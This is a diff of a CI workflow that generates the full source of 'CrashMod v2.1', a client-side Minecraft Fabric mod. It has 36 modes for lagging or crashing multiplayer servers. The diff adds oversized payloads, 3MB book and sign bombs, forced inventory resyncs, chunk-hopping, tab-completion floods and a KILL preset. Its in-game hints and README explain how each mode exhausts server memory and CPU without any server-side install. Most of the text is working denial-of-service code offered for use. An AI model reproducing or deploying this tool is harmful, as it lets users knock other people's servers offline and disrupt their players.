@@ -1,6 +1,9 @@
 # ============================================================================
 #  CrashMod v2 - "BA VUONG"  |  client-only, khong can cai len server
 #  Gradle 9.2.0 + loom 1.15.5 (khop plugin.api-version)
+#
+#  SMOKE TEST: mac dinh TAT. Bat bang Actions > Run workflow > smoke = co
+#              hoac push tag v* (tag thi tu bat).
 # ============================================================================
 name: CrashMod CI
 
@@ -10,6 +13,17 @@ on:
     tags: [ 'v*' ]
   pull_request:
   workflow_dispatch:
+    inputs:
+      smoke:
+        description: 'Chay smoke test (boot dedicated server that, ton them 1-5 phut)?'
+        type: choice
+        options: [ khong, co ]
+        default: khong
+      release:
+        description: 'Tao release?'
+        type: choice
+        options: [ khong, co ]
+        default: co
 
 permissions:
   contents: write
@@ -25,10 +39,76 @@ env:
 jobs:
 
   # ==========================================================================
+  # JOB 0 - QUYET DINH: co test khong, co release khong
+  # ==========================================================================
+  decide:
+    name: Quyet dinh (test / release)
+    runs-on: ubuntu-latest
+    outputs:
+      smoke: ${{ steps.decide.outputs.smoke }}
+      release: ${{ steps.decide.outputs.release }}
+    steps:
+      - name: Doc lua chon
+        id: decide
+        run: |
+          set -euo pipefail
+          S="khong"
+          R="khong"
+
+          case "${{ github.event_name }}" in
+            workflow_dispatch)
+              S="${{ github.event.inputs.smoke }}"
+              R="${{ github.event.inputs.release }}"
+              ;;
+            push)
+              R="co"
+              if [[ "${{ github.ref }}" == refs/tags/v* ]]; then S="co"; fi
+              ;;
+            pull_request)
+              S="khong"; R="khong"
+              ;;
+          esac
+
+          [ "$S" = "co" ] || S="khong"
+          [ "$R" = "co" ] || R="khong"
+
+          echo "smoke=$S"   >> "$GITHUB_OUTPUT"
+          echo "release=$R" >> "$GITHUB_OUTPUT"
+
+          {
+            echo "### CrashMod CI - ke hoach chay"
+            echo ""
+            echo "| Muc | Gia tri |"
+            echo "|---|---|"
+            echo "| event | \`${{ github.event_name }}\` |"
+            echo "| ref | \`${{ github.ref }}\` |"
+            echo "| Smoke test | **$S** |"
+            echo "| Release | **$R** |"
+            echo ""
+            if [ "$S" = "co" ]; then
+              echo "Smoke test SE CHAY: job \`smoke-test\` se boot dedicated server that de xac nhan mod nap duoc."
+            else
+              echo "Smoke test BO QUA: build xong la het, khong boot server. Muon test thi chay workflow_dispatch voi \`smoke = co\`."
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          if [ "$S" = "co" ]; then
+            echo "::notice title=Smoke test::SE CHAY - them khoang 1-5 phut de boot server"
+          else
+            echo "::notice title=Smoke test::BO QUA - build nhanh. Bat bang Actions > Run workflow > smoke = co"
+          fi
+          if [ "$R" = "co" ]; then
+            echo "::notice title=Release::SE TAO release"
+          else
+            echo "::notice title=Release::KHONG tao release"
+          fi
+
+  # ==========================================================================
   # JOB 1 - PREPARE
   # ==========================================================================
   prepare:
     name: Prepare - tu tao file
+    needs: decide
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -54,11 +134,11 @@ jobs:
           org.gradle.jvmargs=-Xmx2G
           org.gradle.parallel=true
           minecraft_version=1.21.11
-          yarn_mappings=1.21.11+build.3
+          yarn_mappings=1.21.11+build.4
           loader_version=0.17.2
           fabric_version=0.141.6+1.21.11
           minecraft_range=~1.21
-          mod_version=2.0.0
+          mod_version=2.1.0
           maven_group=vn.venice.crashmod
           archives_base_name=crashmod
           EOF
@@ -85,7 +165,7 @@ jobs:
           }
 
           def mcVersion     = (findProperty('minecraft_version') ?: '1.21.11').toString()
-          def yarnVersion   = (findProperty('yarn_mappings')     ?: "${mcVersion}+build.3").toString()
+          def yarnVersion   = (findProperty('yarn_mappings')     ?: "${mcVersion}+build.4").toString()
           def loaderVersion = (findProperty('loader_version')    ?: '0.17.2').toString()
           def fabricVersion = (findProperty('fabric_version')    ?: "0.141.6+${mcVersion}").toString()
           def mcRange       = (findProperty('minecraft_range')   ?: '~1.21').toString()
@@ -133,7 +213,7 @@ jobs:
             "id": "crashmod",
             "version": "${version}",
             "name": "CrashMod",
-            "description": "Shift+M mo GUI bat/tat. Book NBT bomb + chunk hop + resync combo.",
+            "description": "Phim M mo GUI. 36 mode lam lag/sap server. Client-only.",
             "authors": [ "Venice" ],
             "license": "MIT",
             "environment": "*",
@@ -174,13 +254,17 @@ jobs:
           import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
           import org.slf4j.Logger;
           import org.slf4j.LoggerFactory;
+          import vn.venice.crashmod.net.BigPayload;
           import vn.venice.crashmod.net.FloodPayload;
 
           public class CrashMod implements ModInitializer {
+
               public static final Logger LOGGER = LoggerFactory.getLogger("CrashMod");
+
               @Override
               public void onInitialize() {
                   PayloadTypeRegistry.playC2S().register(FloodPayload.ID, FloodPayload.CODEC);
+                  PayloadTypeRegistry.playC2S().register(BigPayload.ID, BigPayload.CODEC);
                   LOGGER.info("[CrashMod] da nap");
               }
           }
@@ -197,39 +281,101 @@ jobs:
 
               private CrashRegistry() {}
 
-              public record Mode(String id, String label, int code) {}
+              public record Mode(String id, String group, String label, int code, String hint) {}
+
+              public static final String G_FLOOD = "FLOOD";
+              public static final String G_BOMB  = "BOMB";
+              public static final String G_INV   = "GUI/INV";
+              public static final String G_CHUNK = "CHUNK";
+              public static final String G_COMBO = "COMBO";
 
               public static final List<Integer> RATES = List.of(
                       1, 2, 5, 10, 20, 50, 100, 250, 500, 1000,
                       2500, 5000, 10000, 50000, 100000);
 
-              // FLOOD = re tien, spam so luong lon
-              // BOMB  = dat tien, work moi packet khong lo
               public static final List<Mode> MODES = List.of(
-                      new Mode("swing",      "Swing",       1),
-                      new Mode("look",       "Look",        2),
-                      new Mode("move",       "Move",        3),
-                      new Mode("abilities",  "Abilities",   4),
-                      new Mode("input",      "Input/Sneak", 5),
-                      new Mode("sprint",     "Sprint",      6),
-                      new Mode("close_gui",  "Dong GUI",    7),
-                      new Mode("slot",       "Doi slot",    8),
-                      new Mode("drop",       "Drop item",   9),
-                      new Mode("chat",       "Chat",       10),
-                      new Mode("command",    "Cmd sai",    11),
-                      new Mode("payload",    "Payload",    12),
-                      new Mode("click",      "Click inv",  13),
-                      new Mode("tab",        "Tab",        14),
-                      new Mode("tab_long",   "Tab dai",    15),
-                      new Mode("book_s",     "Book 25KB",  16),
-                      new Mode("book_m",     "Book 100KB", 17),
-                      new Mode("book_x",     "Book 3MB",   18),
-                      new Mode("sign",       "Sign bomb",  19),
-                      new Mode("chunk_hop",  "Chunk hop",  20),
-                      new Mode("move_chaos", "Move loan",  21),
-                      new Mode("slot_flip",  "Lat slot",   22),
-                      new Mode("book_click", "Book+Click", 23),
-                      new Mode("nuke",       "NUKE",       24)
+
+                  // ---- FLOOD: re tien, spam so luong lon, de bi limiter KICK ----
+                  new Mode("swing",      G_FLOOD, "Swing",      1,
+                          "Flood re nhat, tay vung lien tuc. Dung de test ket noi truoc."),
+                  new Mode("look",       G_FLOOD, "Look",       2,
+                          "Gui goc nhin moi packet. Re, camera quay loan."),
+                  new Mode("move",       G_FLOOD, "Move",       3,
+                          "Gui full pos + yaw + pitch. Server chay movement check moi packet."),
+                  new Mode("abilities",  G_FLOOD, "Abilities",  4,
+                          "Gui UpdatePlayerAbilities lien tuc. Re."),
+                  new Mode("input",      G_FLOOD, "Input",      5,
+                          "Gui PlayerInput, sneak bat/tat lien tuc -> server phai doi pose."),
+                  new Mode("sprint",     G_FLOOD, "Sprint",     6,
+                          "Gui START_SPRINTING lien tuc."),
+
+                  // ---- BOMB: dat tien, moi packet work khong lo ----
+                  new Mode("chat",       G_BOMB,  "Chat",        7,
+                          "Chat spam. Server tao message, ky/verify, broadcast, ghi log."),
+                  new Mode("command",    G_BOMB,  "Cmd sai",     8,
+                          "Gui lenh khong ton tai -> server parse Brigadier roi bao loi."),
+                  new Mode("payload",    G_BOMB,  "Payload",     9,
+                          "Payload 0 byte. Server KHONG co mod -> WARN moi packet = LOG BOMB."),
+                  new Mode("payload_big",G_BOMB,  "Payload32K", 10,
+                          "Payload 32KB. Server decode 32KB roi WARN moi packet."),
+                  new Mode("tab",        G_BOMB,  "Tab",        11,
+                          "Xin goi y lenh '/'. Server gui ve TOAN BO command tree (ke ca plugin)."),
+                  new Mode("tab_long",   G_BOMB,  "Tab dai",    12,
+                          "Xin goi y voi chuoi 2000 ky tu -> nang CPU parse."),
+                  new Mode("tab_many",   G_BOMB,  "Tab nhieu",  13,
+                          "Xin goi y voi prefix ngau nhien -> moi lan 1 ket qua khac."),
+                  new Mode("sign",       G_BOMB,  "Sign bomb",  14,
+                          "Update sign 384 ky tu CA 2 MAT = 2 packet. CAN DUNG TREN SIGN THAT."),
+                  new Mode("book_s",     G_BOMB,  "Book 25KB",  15,
+                          "Sach 100 trang x 255 ky tu. CAN CAM SACH VA BUT."),
+                  new Mode("book_m",     G_BOMB,  "Book 100KB", 16,
+                          "Sach 100 trang x 1000 ky tu. CAN CAM SACH VA BUT."),
+                  new Mode("book_x",     G_BOMB,  "Book 3MB",   17,
+                          "Sach 100 trang x 32767 ky tu (sat tran). CAN CAM SACH VA BUT."),
+                  new Mode("book_title", G_BOMB,  "Book+title", 18,
+                          "Book 3MB + title 512 ky tu -> item nang hon moi lan server sync."),
+
+                  // ---- GUI/INV: ep server resync inventory (he so nho nhat) ----
+                  new Mode("close_gui",  G_INV,   "Dong GUI",   19,
+                          "Gui 5 byte -> server syncState() gui lai TOAN BO inventory."),
+                  new Mode("slot",       G_INV,   "Doi slot",   20,
+                          "Doi hotbar slot lien tuc."),
+                  new Mode("drop",       G_INV,   "Drop item",  21,
+                          "Drop 1 item moi packet -> tao ItemEntity. Het stack la dung."),
+                  new Mode("click",      G_INV,   "Click inv",  22,
+                          "Click slot 0 voi revision SAI -> server resync full inventory."),
+                  new Mode("resync",     G_INV,   "Resync inv", 23,
+                          "Click slot 999 (ngoai dai) revision sai -> chi resync, khong doi item."),
+                  new Mode("button",     G_INV,   "Button GUI", 24,
+                          "ButtonClick vao screen handler."),
+                  new Mode("swap_hand",  G_INV,   "Swap hand",  25,
+                          "Doi tay chinh <-> tay phu -> server sync 2 slot."),
+                  new Mode("slot_flip",  G_INV,   "Lat slot",   26,
+                          "Nhay qua lai slot 0 <-> 8."),
+
+                  // ---- CHUNK / STATUS ----
+                  new Mode("chunk_hop",  G_CHUNK, "Chunk hop",  27,
+                          "Nhay 8 block moi packet -> server load/generate chunk. CAN CHO DAT TRONG."),
+                  new Mode("move_chaos", G_CHUNK, "Move loan",  28,
+                          "Gui goc nhin ngau nhien hoan toan."),
+                  new Mode("respawn",    G_CHUNK, "Respawn",    29,
+                          "Gui PERFORM_RESPAWN. Chi an khi ban DANG CHET."),
+                  new Mode("stats",      G_CHUNK, "Stats",      30,
+                          "Xin bang thong ke -> server gui lai TOAN BO stats. 1 vao -> rat lon ra."),
+                  new Mode("interact",   G_CHUNK, "Right block",31,
+                          "Chuot phai block duoi chan. Aim vao crafting table = mo GUI lien tuc."),
+                  new Mode("use_item",   G_CHUNK, "Right item", 32,
+                          "Chuot phai item tren khong (an / nem / ban)."),
+                  new Mode("pick",       G_CHUNK, "Pick block", 33,
+                          "Pick block -> server tra cuu block state roi them item vao tui."),
+
+                  // ---- COMBO ----
+                  new Mode("book_click", G_COMBO, "Book+Click", 34,
+                          "Sach 3MB + click revision sai = DON OOM CHINH. Can cam sach va but."),
+                  new Mode("nuke",       G_COMBO, "NUKE",       35,
+                          "Quay vong 13 mode flood/bomb co ban."),
+                  new Mode("nuke2",      G_COMBO, "NUKE 2",     36,
+                          "Quay vong 11 mode moi (status, interact, resync, payload...).")
               );
 
               public static int codeOf(String id) {
@@ -280,9 +426,11 @@ jobs:
                   changed();
               }
 
+              /** Preset KILL: sach 3MB + ep resync + chunk hop + tab dai, rate 100 */
               public static void killPreset() {
                   enabled.clear();
-                  enabled.addAll(List.of("book_click", "click", "chunk_hop", "drop", "tab_long"));
+                  enabled.addAll(List.of(
+                          "book_click", "resync", "click", "close_gui", "chunk_hop", "tab_long"));
                   rateIndex = CrashRegistry.RATES.indexOf(100);
                   changed();
               }
@@ -357,6 +505,33 @@ jobs:
           EOF
           fi
 
+          if [ ! -f src/main/java/vn/venice/crashmod/net/BigPayload.java ]; then
+          cat > src/main/java/vn/venice/crashmod/net/BigPayload.java <<'EOF'
+          package vn.venice.crashmod.net;
+
+          import net.minecraft.network.RegistryByteBuf;
+          import net.minecraft.network.codec.PacketCodec;
+          import net.minecraft.network.codec.PacketCodecs;
+          import net.minecraft.network.packet.CustomPayload;
+          import net.minecraft.util.Identifier;
+
+          /** Payload 32KB: server phai doc 32KB roi WARN moi packet. */
+          public record BigPayload(byte[] data) implements CustomPayload {
+
+              public static final BigPayload INSTANCE = new BigPayload(new byte[32768]);
+
+              public static final CustomPayload.Id<BigPayload> ID =
+                      new CustomPayload.Id<>(Identifier.of("crashmod", "flood_big"));
+
+              public static final PacketCodec<RegistryByteBuf, BigPayload> CODEC =
+                      PacketCodec.tuple(PacketCodecs.BYTE_ARRAY, BigPayload::data, BigPayload::new);
+
+              @Override
+              public CustomPayload.Id<? extends CustomPayload> getId() { return ID; }
+          }
+          EOF
+          fi
+
           if [ ! -f src/main/java/vn/venice/crashmod/client/Packets.java ]; then
           cat > src/main/java/vn/venice/crashmod/client/Packets.java <<'EOF'
           package vn.venice.crashmod.client;
@@ -364,16 +539,20 @@ jobs:
           import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
           import net.minecraft.client.MinecraftClient;
           import net.minecraft.client.network.ClientPlayerEntity;
-          import net.minecraft.item.ItemStack;
           import net.minecraft.item.Items;
           import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
           import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
+          import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
           import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
+          import net.minecraft.network.packet.c2s.play.ClientStatusC2SPacket;
           import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
           import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
           import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
+          import net.minecraft.network.packet.c2s.play.PickItemFromBlockC2SPacket;
           import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
           import net.minecraft.network.packet.c2s.play.PlayerInputC2SPacket;
+          import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
+          import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
           import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
           import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
           import net.minecraft.network.packet.c2s.play.UpdatePlayerAbilitiesC2SPacket;
@@ -383,8 +562,11 @@ jobs:
           import net.minecraft.screen.sync.ItemStackHash;
           import net.minecraft.util.Hand;
           import net.minecraft.util.PlayerInput;
+          import net.minecraft.util.math.BlockHitResult;
           import net.minecraft.util.math.BlockPos;
           import net.minecraft.util.math.Direction;
+          import net.minecraft.util.math.Vec3d;
+          import vn.venice.crashmod.net.BigPayload;
           import vn.venice.crashmod.net.FloodPayload;
 
           import java.util.ArrayList;
@@ -396,8 +578,9 @@ jobs:
               private Packets() {}
 
               private static int tx = 0;
-              private static final String LONG_CMD  = "/" + "a".repeat(2000);
-              private static final String SIGN_LINE = "A".repeat(384);
+              private static final String LONG_CMD   = "/" + "a".repeat(2000);
+              private static final String SIGN_LINE  = "A".repeat(384);
+              private static final String BOOK_TITLE = "A".repeat(512);
 
               private static final List<String> BOOK_25K  = book(100, 255);
               private static final List<String> BOOK_100K = book(100, 1000);
@@ -410,7 +593,6 @@ jobs:
                   return out;
               }
 
-              /** 1.21.9+ getSelectedSlot()  |  <= 1.21.8 doi thanh .selectedSlot */
               private static int sel(ClientPlayerEntity p) {
                   return p.getInventory().getSelectedSlot();
               }
@@ -440,52 +622,70 @@ jobs:
                       case 4 -> p.networkHandler.sendPacket(
                               new UpdatePlayerAbilitiesC2SPacket(p.getAbilities()));
 
-                      // 1.21.6+ : press/release shift di qua PlayerInputC2SPacket
-                      // (ClientCommandC2SPacket.Mode khong con PRESS_SHIFT_KEY nua)
                       case 5 -> p.networkHandler.sendPacket(new PlayerInputC2SPacket(
                               new PlayerInput(false, false, false, false, false, tx % 2 == 0, false)));
 
                       case 6 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
                               p, ClientCommandC2SPacket.Mode.START_SPRINTING));
 
-                      case 7 -> p.networkHandler.sendPacket(
-                              new CloseHandledScreenC2SPacket(p.currentScreenHandler.syncId));
+                      // ---------------- BOMB ----------------
+                      case 7 -> p.networkHandler.sendChatMessage("CrashMod " + tx);
 
-                      case 8 -> p.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(tx % 9));
+                      case 8 -> p.networkHandler.sendChatCommand("crashmod" + tx);
 
-                      case 9 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
-                              PlayerActionC2SPacket.Action.DROP_ITEM, BlockPos.ORIGIN, Direction.DOWN));
-
-                      case 10 -> p.networkHandler.sendChatMessage("CrashMod " + tx);
-
-                      // 1.21.9+ : sendCommand() -> sendChatCommand()
-                      case 11 -> p.networkHandler.sendChatCommand("crashmod" + tx);
-
-                      case 12 -> p.networkHandler.sendPacket(
+                      case 9 -> p.networkHandler.sendPacket(
                               new CustomPayloadC2SPacket(FloodPayload.INSTANCE));
 
-                      // ---------------- BOMB ----------------
-                      case 13 -> click(p);
+                      case 10 -> p.networkHandler.sendPacket(
+                              new CustomPayloadC2SPacket(BigPayload.INSTANCE));
 
-                      case 14 -> p.networkHandler.sendPacket(
+                      case 11 -> p.networkHandler.sendPacket(
                               new RequestCommandCompletionsC2SPacket(tx, "/"));
 
-                      case 15 -> p.networkHandler.sendPacket(
+                      case 12 -> p.networkHandler.sendPacket(
                               new RequestCommandCompletionsC2SPacket(tx, LONG_CMD));
 
-                      case 16 -> book(p, BOOK_25K);
-                      case 17 -> book(p, BOOK_100K);
-                      case 18 -> book(p, BOOK_3M);
+                      case 13 -> p.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(
+                              tx, "/" + (char) ('a' + (tx % 26))));
 
-                      case 19 -> {
+                      case 14 -> {
                           BlockPos pos = BlockPos.ofFloored(p.getX(), p.getY(), p.getZ());
-                          // 1.21.9+ : 4 String roi, khong con String[]
                           p.networkHandler.sendPacket(new UpdateSignC2SPacket(
                                   pos, true, SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE));
+                          p.networkHandler.sendPacket(new UpdateSignC2SPacket(
+                                  pos, false, SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE));
                       }
 
-                      // ---------------- CHUNK ----------------
-                      case 20 -> {
+                      case 15 -> book(p, BOOK_25K, false);
+                      case 16 -> book(p, BOOK_100K, false);
+                      case 17 -> book(p, BOOK_3M, false);
+                      case 18 -> book(p, BOOK_3M, true);
+
+                      // ---------------- GUI / INVENTORY ----------------
+                      case 19 -> p.networkHandler.sendPacket(
+                              new CloseHandledScreenC2SPacket(p.currentScreenHandler.syncId));
+
+                      case 20 -> p.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(tx % 9));
+
+                      case 21 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
+                              PlayerActionC2SPacket.Action.DROP_ITEM, BlockPos.ORIGIN, Direction.DOWN));
+
+                      case 22 -> click(p, (short) 0);
+
+                      case 23 -> click(p, (short) 999);
+
+                      case 24 -> p.networkHandler.sendPacket(
+                              new ButtonClickC2SPacket(p.currentScreenHandler.syncId, 0));
+
+                      case 25 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
+                              PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND,
+                              BlockPos.ORIGIN, Direction.DOWN));
+
+                      case 26 -> p.networkHandler.sendPacket(
+                              new UpdateSelectedSlotC2SPacket(tx % 2 == 0 ? 0 : 8));
+
+                      // ---------------- CHUNK / STATUS ----------------
+                      case 27 -> {
                           if (Double.isNaN(hopX)) { hopX = p.getX(); hopZ = p.getZ(); }
                           hopX += 8.0;
                           if (hopX > 15000.0) { hopX = -15000.0; hopZ += 512.0; }
@@ -493,21 +693,45 @@ jobs:
                                   hopX, p.getY(), hopZ, p.getYaw(), p.getPitch(), true, false));
                       }
 
-                      case 21 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
+                      case 28 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                               (float) (Math.random() * 720.0 - 360.0),
                               (float) (Math.random() * 180.0 - 90.0), true, false));
 
-                      case 22 -> p.networkHandler.sendPacket(
-                              new UpdateSelectedSlotC2SPacket(tx % 2 == 0 ? 0 : 8));
+                      case 29 -> p.networkHandler.sendPacket(
+                              new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.PERFORM_RESPAWN));
 
-                      // ---------------- COMBO ----------------
-                      case 23 -> {
-                          if (tx % 100 == 0) book(p, BOOK_100K);
-                          click(p);
+                      case 30 -> p.networkHandler.sendPacket(
+                              new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.REQUEST_STATS));
+
+                      case 31 -> {
+                          BlockPos pos = p.getBlockPos().down();
+                          p.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
+                                  Hand.MAIN_HAND,
+                                  new BlockHitResult(
+                                          new Vec3d(pos.getX() + 0.5, pos.getY() + 1.0, pos.getZ() + 0.5),
+                                          Direction.UP, pos, false),
+                                  tx));
                       }
 
-                      case 24 -> {
-                          int[] ring = {1, 2, 3, 4, 5, 7, 9, 10, 13, 14, 15, 20, 21};
+                      case 32 -> p.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(
+                              Hand.MAIN_HAND, tx, p.getYaw(), p.getPitch()));
+
+                      case 33 -> p.networkHandler.sendPacket(
+                              new PickItemFromBlockC2SPacket(p.getBlockPos().down(), true));
+
+                      // ---------------- COMBO ----------------
+                      case 34 -> {
+                          if (tx % 100 == 0) book(p, BOOK_3M, true);
+                          click(p, (short) 0);
+                      }
+
+                      case 35 -> {
+                          int[] ring = {1, 2, 3, 4, 5, 7, 9, 11, 14, 19, 22, 27, 28};
+                          send(client, ring[tx % ring.length]);
+                      }
+
+                      case 36 -> {
+                          int[] ring = {10, 13, 18, 23, 24, 25, 29, 30, 31, 32, 33};
                           send(client, ring[tx % ring.length]);
                       }
 
@@ -515,24 +739,22 @@ jobs:
                   }
               }
 
-              private static void click(ClientPlayerEntity p) {
-                  // 1.21.9+ : (int syncId, int revision, short slot, byte button,
-                  //            SlotActionType, Int2ObjectMap<ItemStackHash>, ItemStackHash)
-                  // revision = tx  -> gui revision sai -> server buoc phai syncState() full inventory
+              /** revision = tx (SAI) -> server syncState() gui lai full inventory */
+              private static void click(ClientPlayerEntity p, short slot) {
                   p.networkHandler.sendPacket(new ClickSlotC2SPacket(
                           p.currentScreenHandler.syncId,
                           tx,
-                          (short) 0,
+                          slot,
                           (byte) 0,
                           SlotActionType.PICKUP,
                           new Int2ObjectArrayMap<ItemStackHash>(),
                           ItemStackHash.EMPTY));
               }
 
-              private static void book(ClientPlayerEntity p, List<String> pages) {
-                  // 1.21.9+ : title la Optional<String>
+              private static void book(ClientPlayerEntity p, List<String> pages, boolean titled) {
                   p.networkHandler.sendPacket(new BookUpdateC2SPacket(
-                          sel(p), pages, Optional.empty()));
+                          sel(p), pages,
+                          titled ? Optional.of(BOOK_TITLE) : Optional.empty()));
               }
           }
           EOF
@@ -556,7 +778,6 @@ jobs:
 
               public static KeyBinding openKey;
 
-              // 1.21.9+ : KeyBinding can KeyBinding.Category, khong nhan String nua
               private static final KeyBinding.Category CATEGORY =
                       KeyBinding.Category.create(Identifier.of("crashmod", "main"));
 
@@ -604,81 +825,197 @@ jobs:
 
           public class ToggleScreen extends Screen {
 
+              private static String hint =
+                      "Bam 1 mode de doc ghi chu. Phim la M (khong phai Shift+M).";
+
               public ToggleScreen() { super(Text.literal("CrashMod v2")); }
 
               private static void rebuild() {
                   MinecraftClient.getInstance().setScreen(new ToggleScreen());
               }
 
-              private static Text label(CrashRegistry.Mode m) {
-                  return Text.literal(Config.isOn(m.id())
-                          ? "\u00a7a[x] \u00a7f" + m.label()
-                          : "\u00a78[ ] \u00a77" + m.label());
+              private static String colorOf(String group) {
+                  return switch (group) {
+                      case CrashRegistry.G_FLOOD -> "\u00a77";
+                      case CrashRegistry.G_BOMB  -> "\u00a7e";
+                      case CrashRegistry.G_INV   -> "\u00a7b";
+                      case CrashRegistry.G_CHUNK -> "\u00a7d";
+                      default                    -> "\u00a7c";
+                  };
               }
 
-              /** 1.21.9+ : TextWidget khong con alignCenter() -> tu canh giua */
-              private void header(Text text, int y, int centerX, MinecraftClient mc) {
+              private static Text label(CrashRegistry.Mode m) {
+                  return Text.literal(colorOf(m.group())
+                          + (Config.isOn(m.id()) ? "[x] " : "[ ] ") + m.label());
+              }
+
+              private void line(Text text, int y, int centerX, MinecraftClient mc) {
                   int w = mc.textRenderer.getWidth(text);
-                  addDrawableChild(new TextWidget(centerX - w / 2, y, w, 10, text, mc.textRenderer));
+                  addDrawableChild(new TextWidget(centerX - w / 2, y, w, 9, text, mc.textRenderer));
               }
 
               @Override
               protected void init() {
-                  int cols = 3, colW = 112, h = 18, gapX = 6, gapY = 2;
-                  int totalW = cols * colW + (cols - 1) * gapX;
-                  int startX = this.width / 2 - totalW / 2;
+                  MinecraftClient mc = MinecraftClient.getInstance();
                   int centerX = this.width / 2;
 
-                  MinecraftClient mc = MinecraftClient.getInstance();
+                  int cols = 4, colW = 110, h = 16, gapX = 5, gapY = 1;
+                  int totalW = cols * colW + (cols - 1) * gapX;
+                  int startX = centerX - totalW / 2;
+
                   boolean hasBook = mc.player != null && Packets.holdingBook(mc.player);
 
-                  header(Text.literal("\u00a77Shift+M  \u00a78|  \u00a7abat: \u00a7f"
-                          + Config.enabled.size() + "  \u00a78|  \u00a7arate: \u00a7f"
-                          + Config.rate() + " pkt/tick"), 6, centerX, mc);
+                  line(Text.literal("\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
+                          + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
+                          + " pkt/tick  \u00a78(= " + (Config.rate() * 20) + " pkt/s)"), 4, centerX, mc);
 
-                  header(Text.literal(hasBook
-                          ? "\u00a7asach tren tay: CO  \u00a78(book bomb san sang)"
-                          : "\u00a7csach tren tay: KHONG  \u00a78(cam sach+but de dung book bomb)"),
-                          16, centerX, mc);
+                  line(Text.literal(hasBook
+                          ? "\u00a7asach tren tay: CO \u00a78- book bomb san sang"
+                          : "\u00a7csach tren tay: KHONG \u00a78- cam SACH VA BUT de dung Book*"),
+                          13, centerX, mc);
+
+                  line(Text.literal("\u00a77FLOOD \u00a7eBOMB \u00a7bGUI/INV \u00a7dCHUNK \u00a7cCOMBO"
+                          + "  \u00a78|  \u00a77cang do cang manh, cang de bi KICK"), 22, centerX, mc);
+
+                  line(Text.literal("\u00a78" + hint), 31, centerX, mc);
 
                   int i = 0;
                   for (CrashRegistry.Mode m : CrashRegistry.MODES) {
                       final CrashRegistry.Mode mode = m;
                       int x = startX + (i % cols) * (colW + gapX);
-                      int y = 30 + (i / cols) * (h + gapY);
+                      int y = 42 + (i / cols) * (h + gapY);
                       addDrawableChild(ButtonWidget.builder(label(mode), b -> {
+                          hint = mode.label() + ": " + mode.hint();
                           Config.toggle(mode.id());
                           rebuild();
                       }).dimensions(x, y, colW, h).build());
                       i++;
                   }
 
-                  int sy = 30 + 8 * (h + gapY) + 6;
+                  int rows = (CrashRegistry.MODES.size() + cols - 1) / cols;
+                  int sy = 42 + rows * (h + gapY) + 4;
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7c-"), b -> {
                       Config.bumpRate(-1); rebuild();
-                  }).dimensions(startX, sy, 30, 20).build());
+                  }).dimensions(startX, sy, 26, 18).build());
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7a+"), b -> {
                       Config.bumpRate(1); rebuild();
-                  }).dimensions(startX + 34, sy, 30, 20).build());
+                  }).dimensions(startX + 30, sy, 26, 18).build());
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7dKILL"), b -> {
                       Config.killPreset(); rebuild();
-                  }).dimensions(startX + 68, sy, 76, 20).build());
+                  }).dimensions(startX + 60, sy, 56, 18).build());
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("BAT HET"), b -> {
                       Config.setAll(true); rebuild();
-                  }).dimensions(startX + 148, sy, 76, 20).build());
+                  }).dimensions(startX + 120, sy, 96, 18).build());
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("TAT HET"), b -> {
                       Config.setAll(false); rebuild();
-                  }).dimensions(startX + 228, sy, 76, 20).build());
+                  }).dimensions(startX + 220, sy, 96, 18).build());
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("Dong"), b -> close())
-                          .dimensions(startX + 308, sy, 40, 20).build());
+                          .dimensions(startX + 320, sy, 60, 18).build());
               }
           }
+          EOF
+          fi
+
+          # ======================= README ======================= #
+          if [ ! -f README.md ]; then
+          cat > README.md <<'EOF'
+          # CrashMod v2.1 — Minecraft 1.21.11
+
+          Client-only. **Server KHONG can cai.** Chi can Fabric Loader + Fabric API o phia client.
+
+          ## Cai dat
+          1. Minecraft 1.21.11 + Fabric Loader >= 0.15
+          2. Bo **Fabric API** vao `.minecraft/mods/`
+          3. Bo `crashmod-1.21.11-*.jar` vao `.minecraft/mods/`
+
+          Vao duoc world = mod da nap. Khong can op, khong can cai gi len server.
+
+          ## Mo bang dieu khien
+          Vao world, bam phim **M**.
+
+          - GUI ghi "Shift+M" nhung phim that la **M** (khong co Shift).
